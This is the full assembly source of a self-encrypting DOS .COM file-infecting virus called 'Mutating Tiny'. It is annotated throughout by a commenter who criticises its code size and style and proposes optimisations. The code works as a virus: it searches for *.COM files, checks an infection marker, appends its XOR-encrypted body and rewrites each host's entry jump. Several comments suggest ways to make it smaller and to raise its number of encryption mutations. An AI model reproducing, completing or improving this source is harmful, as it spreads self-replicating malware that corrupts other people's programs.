muttiny         segment byte public
                assume  cs:muttiny, ds:muttiny

                org     100h

start:          db      0e9h, 5, 0              ; jmp     startvir
restorehere:    int     20h
idword:         dw      990h
; The next line is incredibly pointless. It is a holdover from one
; of the original TINYs, where the id was 7, 8, 9.  The author can
; easily save one byte merely by deleting this line.
                db      09h
startvir:
                call    oldtrick                ; Standard location-finder
oldtrick:       pop     si
; The following statement is a bug -- well, not really a bug, just
; extraneous code.  The value pushed on the stack in the following
; line is NEVER popped off. This is messy programming, as one byte
; could be saved by removing the statement.
                push    si
                sub     si,offset oldtrick
                call    encrypt                 ; Decrypt virus
                call    savepsp                 ;  and save the PSP
; NOTE:  The entire savepsp/restorepsp procedures are unnecessary.
;        See the procedures at the end for further details.
                jmp     short findencryptval    ; Go to the rest of the virus
; The next line is another example of messy programming -- it is a
; NOP inserted by MASM during assembly.  Running this file through
; TASM with the /m2 switch should eliminate such "fix-ups."
                nop
; The next line leaves me guessing as to the author's true intent.
                db      0

encryptval      dw      0h

encrypt:
                push    bx                      ; Save handle
; The following two lines of code could be condensed into one:
;       lea bx, [si+offset startencrypt]
; Once again, poor programming style, though there's nothing wrong
; with the code.
                mov     bx,offset startencrypt
                add     bx,si
; Continueencrypt is implemented as a jmp-type loop. Although it's
; fine to code it this way, it's probably easier to code using the
; loop statement.  Upon close inspection, one finds the loop to be
; flawed. Note the single inc bx statement. This essentially makes
; the encryption value a a byte instead of a word, which decreases
; the number of mutations from 65,535 to 255.  Once again, this is
; just poor programming, very easily rectified with another inc bx
; statement. Another optimization could be made.  Use a
;       mov dx, [si+encryptval]
; to load up the encryption value before the loop, and replace the
; three lines following continueencrypt with a simple:
;       xor word ptr [bx], dx
continueencrypt:
                mov     ax,[bx]
                xor     ax,word ptr [si+encryptval]
                mov     [bx],ax
                inc     bx
; The next two lines should be executed BEFORE continueencrypt. As
; it stands right now, they are recalculated every iteration which
; slows down execution somewhat. Furthermore, the value calculated
; is much too large and this increases execution time. Yet another
; improvement would be the merging of the mov/add pair to the much
; cleaner lea cx, [si+offset endvirus].
                mov     cx,offset veryend       ; Calculate end of
                add     cx,si                   ; encryption: Note
                cmp     bx,cx                   ; the value is 246
                jle     continueencrypt         ; bytes too large.
                pop     bx
                ret
writerest:                                      ; Tack on the virus to the
                call    encrypt                 ; end of the file.
                mov     ah,40h
                mov     cx,offset endvirus - offset idword
                lea     dx,[si+offset idword]   ; Write starting from the id
                int     21h                     ; word
                call    encrypt
                ret

startencrypt:
; This is where the encrypted area begins.  This could be moved to
; where the ret is in procedure writerest, but it is not necessary
; since it won't affect the "scannability" of the virus.

findencryptval:
                mov     ah,2Ch                  ; Get random #
                int     21h                     ; CX=hr/min dx=sec
; The following chunk of code puzzles me. I admit it, I am totally
; lost as to its purpose.
                cmp     word ptr [si+offset encryptval],0
                je      step_two
                cmp     word ptr [si+offset encryptval+1],0
                je      step_two
                cmp     dh,0Fh
                jle     foundencryptionvalue
step_two:                                       ; Check to see if any
                cmp     dl,0                    ; part of the encryption
                je      findencryptval          ; value is 0 and if so,
                cmp     dh,0                    ; find another value.
                je      findencryptval
                mov     [si+offset encryptval],dx
foundencryptionvalue:
                mov     bp,[si+offset oldjmp]   ; Set up bp for
                add     bp,103h                 ; jmp later
                lea     dx,[si+filemask]        ; '*.COM',0
                xor     cx,cx                   ; Attributes
                mov     ah,4Eh                  ; Find first
tryanother:
                int     21h
                jc      quit_virus              ; If none found, exit

                mov     ax,3D02h                ; Open read/write
                mov     dx,9Eh                  ; In default DTA
                int     21h

                mov     cx,3
                mov     bx,ax                   ; Swap file handle register
                lea     dx,[si+offset buffer]
                mov     di,dx
                call    read                    ; Read 3 bytes
                cmp     byte ptr [di],0E9h      ; Is it a jmp?
                je      infect
findnext:
                mov     ah,4Fh                  ; If not, find next
                jmp     short tryanother
infect:
                mov     ax,4200h                ; Move file pointer
                mov     dx,[di+1]               ; to jmp location
                mov     [si+offset oldjmp],dx   ; and save old jmp
                xor     cx,cx                   ; location
                call    int21h
                jmp     short skipcheckinf
; Once again, we meet an infamous MASM-NOP.
                nop
; I don't understand why checkinf is implemented as a procedure as
; it is executed but once.  It is a waste of code space to do such
; a thing. The ret and call are both extra, wasting four bytes. An
; additional three bytes were wasted on the JMP skipping checkinf.
; In a program called "Tiny," a wasted seven bytes is rather large
; and should not exist.  I have written a virus of half the length
; of this virus which is a generic COM infector. There is just too
; too much waste in this program.
checkinf:
                cmp     word ptr [di],990h      ; Is it already
                je      findnext                ; infected?
; The je statement above presents another problem. It leaves stuff
; on the stack from the call.  This is, once again, not a critical
; error but nevertheless it is extremely sloppy behavior.
                xor     dx,dx
                xor     cx,cx
                mov     ax,4202h
                call    int21h                  ; Goto end of file
                ret
skipcheckinf:
                mov     cx,2
                mov     dx,di
                call    read                    ; read 2 bytes
                call    checkinf
; The next check is extraneous.  No COM file is larger than 65,535
; bytes before infection simply because it is "illegal."  Yet ano-
; ther waste of code.  Even if one were to use this useless check,
; it should be implemented, to save space, as or dx, dx.
                cmp     dx,0                    ; Check if too big
                jne     findnext

                cmp     ah,0FEh                 ; Check again if too big
                jae     findnext
                mov     [si+storejmp],ax        ; Save new jmp
                call    writerest               ;     location
                mov     ax,4200h                ; Go to offset
                mov     dx,1                    ; 1 in the file
                xor     cx,cx
                call    int21h

                mov     ah,40h                  ; and write the new
                mov     cx,2                    ; jmp location
                lea     dx,[si+storejmp]
                call    int21h
; I think it is quite obvious that the next line is pointless.  It
; is a truly moronic waste of two bytes.
                jc      closefile
closefile:
                mov     ah,3Eh                  ; Close the file
                call    int21h
quit_virus:
                call    restorepsp
                jmp     bp

read:
                mov     ah,3Fh                  ; Read file
; I do not understand why all the int 21h calls are done with this
; procedure.  It is a waste of space. A normal int 21h call is two
; bytes long while it's three bytes just to call this procedure!
int21h:
                int     21h
                ret

                db      'Made in England'

; Note: The comments for savepsp also apply to restorepsp.

; This code could have easily been changed to a set active DTA INT
; 21h call (AH = 1Ah).  It would have saved many, many bytes.

savepsp:
                mov     di,0
; The following is a bug.  It should be
;       mov cx, 50h
; since the author decided to use words instead of bytes.
                mov     cx,100h
                push    si
; The loop below is dumb.  A simple rep movsw statement would have
; sufficed.  Instead, countless bytes are wasted on the loop.
storebytes:
                mov     ax,[di]
                mov     word ptr [si+pspstore],ax
                add     si,2
                add     di,2
                loop    storebytes
                pop     si
                ret

restorepsp:
                mov     di,0
                mov     cx,100h                 ; Restore 200h bytes
                push    si
restorebytes:
                mov     ax,word ptr [si+pspstore]
                mov     [di],ax
                add     si,2
                add     di,2
                loop    restorebytes
                pop     si
                ret

oldjmp          dw      0
filemask        db      '*.COM',0
idontknow1      db      66h                     ; Waste of one byte
buffer          db      00h, 00h, 01h           ; Waste of three bytes
storejmp        dw      0                       ; Waste of two bytes
; endvirus should be before idontknow1, thereby saving six bytes.
endvirus:
idontknow2      db      ?, ?
pspstore        db      200 dup (?)             ; Should actually be
idontknow3      db      2ch dup (?)             ; 100h bytes long.
veryend:                                        ; End of encryption
muttiny         ends
                end     start

